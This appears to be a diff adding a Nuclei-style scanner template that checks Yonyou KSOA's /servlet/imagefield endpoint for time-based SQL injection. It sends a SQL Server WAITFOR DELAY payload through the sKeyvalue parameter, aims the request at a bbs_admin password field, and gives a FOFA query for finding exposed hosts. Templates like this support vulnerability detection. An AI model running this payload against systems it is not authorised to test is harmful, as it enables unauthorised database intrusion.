@@ -1,0 +1,28 @@
+id: yongyou-KSOA-servletimagefield-sKeyvalue-sqli
+
+info:
+  name: yongyou-KSOA-servletimagefield-sKeyvalue-sqli
+  author: rum3ch
+  severity: high
+  description: 用友时空KSOA是建立在SOA理念指导下研发的新一代产品，用友时空KSOAservletimagefield文件sKeyvalue参数存在延迟注入。
+  tags: yongyou-KSOA,sqli
+  metadata:
+    fofa-qeury: app="用友-时空KSOA"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1';+{{sqlserver}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      sqlserver:
+        - "WAITFOR+DELAY+%270:0:5%27--"
+               
+    matchers:     
+      - type: dsl
+        name: sqlserver
+        dsl:
+          - "status_code == 200 && duration>=3 && duration<=8 && contains(header,'image')" 
